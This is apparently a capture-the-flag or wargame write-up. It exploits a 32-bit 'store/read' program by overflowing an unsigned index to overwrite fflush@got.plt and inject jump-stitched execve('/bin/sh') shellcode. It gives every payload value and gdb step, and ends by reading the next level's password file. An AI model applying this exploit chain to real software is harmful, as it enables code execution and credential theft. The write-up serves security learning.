
/**********************************************/
    P R O G R A M    E X P L A N A T I O N S
/**********************************************/

=> We can run 3 commands in this program

=> "store" allow us to write a number (uint) at buffer[index*4], where index is also a uint
We have the possiblity to write in our stack than the condition are met (index is not multiple of 3 AND the 8 most significants bytes of number begin by B7000000 - 3070230528

=> "read" can read an unsigned int from the index buffer[index*4]

=> "quit" quit the program

/********************************************/
		S T R A T E G Y 
/********************************************/

=====> F A I L =====>
- cannot overwrite ret addr of main (index 114)
can overwrite ebp 113 but not ret addr 114
- cannot overwrite ret addr of store_number (-11) 
same like probleme like index ret addr main
=> mainly because of % 3


=====> New Strategy  =====>
=> Let's try to overwrite an address in the got.plt entry 
=> It seems possible because it has more than 3 addr functions so we can access one of them (counter % 3)

/*****************************/
	G O T . P L T 
/*****************************/

=> Firstly we need to find the index of the buffer 
Input command: store
 Number: 55 (0x37)
 Index: 1
0xffffd570:	0x00000000 0x00000000 <- buffer[0]  0x00000037 (55) <- buffer[1] 0x00000000
buffer[0]:	0xffffd574

=> Now we need to have the offset to acces the got.plt table from the buffer address


0xffffffff - 0xffffd574 => 
End stack  - buffer[0]  =>
4294967295 - 4294956404 = 10891 

=> We will focus the fflush@got.plt address
804a004 (134520836) <fflush@got.plt>:     0xf7e90880
804a004 + (0xff... - buffer[0]) = 134520836 + 10891 = 134531727

(gdb) x 0xffffd574 + 134531727 (buffer[0] + index)
0x804a003 <printf@got.plt+3>:	0x048486f7

=> We have the address 0x804a003 we need to add 1 to have 804a004 (printf@got.plt)

(gdb) x 0xffffd574 + 134531728
0x804a004 <fflush@got.plt>:	0x08048486

=> We then divide it by 4 and check if it pass the modulo condition (% 3)
134531728 รท 4 = 33632932
33632932 % 3 = 1
=> The index is not a multiple of 3

Input command: store
 Number: 55
 Index: 33632932
...
(gdb) c
Input command: store
Program received signal SIGSEGV, Segmentation fault.
0x00000037 in ?? ()

=> The redirection of fflush is redirect to an arbitrary address (number)  
=> We can redirect the execution of printf to the stack
buffer[1] = 0xffffd578 = 4294956408

=> We try it with a sigtrap
Input command: store
 Number: 3435973836 (\xcc\xcc\xcc\xcc)
 Index: 1 (buffer[1])
...
Input command: store
 Number: 4294956408 (buffer[1])
 Index: 33632932 (index * 4 to write to fflush@got.plt)
...
Program received signal SIGTRAP, Trace/breakpoint trap.
0xffffd579 in ?? ()


/******************************************/
	 S H E L L    C O D E 
/******************************************/


=> Now that we can redirect the execution to buffer[1] we will write a shell code in that buffer
=> We have a problem that we can't write more that 2 consecutive addresses because of the modulo 3
=> So to resolve this problem we will slice our buffer with a jump every two adresses


gdb 67 64 62
env 65 6e 76

-2 +10 +20 

= 28





















store:
        number: 55
        index: 33632933 in gdb (!!! 33632936 in vm !!!)
Program received signal SIGSEGV, Segmentation fault.
0x00000037 in ?? ()
-> IT WORKS 

-> Try to redirect in a sigtrap in the buffer (buffer[0] = \xCC)
-> Found buffer[1] = 0xffffd578 (4294956408) in gdb (0xFFFFD568 in vm)
store:
	number:	3435973836 (\xcc\xcc\xcc\xcc)
	index: 	1

store:
	number: 4294956408 (addr buffer[1])
	index:  33632933 (overflow uint to got.plt entries)


-> Create payload:
Contraints 2 * 4 bytes consecutives maximum because of modulo 3, 
then we need to add relative jump to our payload
\xEB\x04 jmp 4 bytes

Exemple:
0xffffd56c:	0xffffd7d8	0x00000000	0x00000000	0x90909090
0xffffd57c:	0x04eb9090	0x00000000	0xcccccccc	0x00000000


0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  89 c1                   mov    ecx,eax
11: 89 c2                   mov    edx,eax
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
17: 31 c0                   xor    eax,eax
19: 40                      inc    eax
1a: cd 80                   int    0x80

Little endian shell code + jumps

\x90\x90\x90\x90  \x04\xeb\x90\x90
2425393296	  82546832

\x31\xc0\x50\x90 \x90\x90\xEB\x04
9050c031	 04eb9090
2421211185	 82546832
    1		     2

\x68\x2f\x2f\x73 \x68\x90\xEB\x04
732f2f68	 04eb9068
1932472168	 82546792
    4		     5

\x68\x2f\x62\x69 \x6e\x90\xEB\x04
69622f68	 04eb906e
1768042344	 82546798 
    7		     8

\x89\xe3\x89\xc1 \x89\xc2\xEB\x04
c189e389	 04ebc289
3247039369	 82559625
    10		    11

\xb0\x0b\xcd\x80 \x31\xc0\xEB\x04
80cd0bb0	 04ebc031
2160921520	 82559025
    13		    14

\x40\xcd\x80
80cd40
8441152
   16

/*******************************************************************/
		F I N A L

Input command: store
 Number: 3435973836
 Index: 1
 Completed store command successfully
Input command: store
 Number: 4294956392
 Index: 33632936
 Completed store command successfully
Input command: store
Trace/breakpoint trap (core dumped)

***********************************************************************


Input command: store
 Number: 2421211185
 Index: 1
 Completed store command successfully
Input command: store
 Number: 82546832
 Index: 2
 Completed store command successfully
Input command: store
 Number: 1932472168
 Index: 4
 Completed store command successfully
Input command: store
 Number: 82546792
 Index: 5
 Completed store command successfully
Input command: store
 Number: 1768042344
 Index: 7
 Completed store command successfully
Input command: store
 Number: 82546798
 Index: 8
 Completed store command successfully
Input command: store
 Number: 3247039369
 Index: 10
 Completed store command successfully
Input command: store
 Number: 82559625
 Index: 11
 Completed store command successfully
Input command: store
 Number: 2160921520
 Index: 13
 Completed store command successfully
Input command: store
 Number: 82559025
 Index: 14
 Completed store command successfully
Input command: store
 Number: 8441152
 Index: 16
 Completed store command successfully
Input command: store
 Number: 4294956392
 Index: 33632936
 Completed store command successfully
Input command: store
$ whoami
level08
$ cat /home/users/level08/.pass

/*******************************************************************/

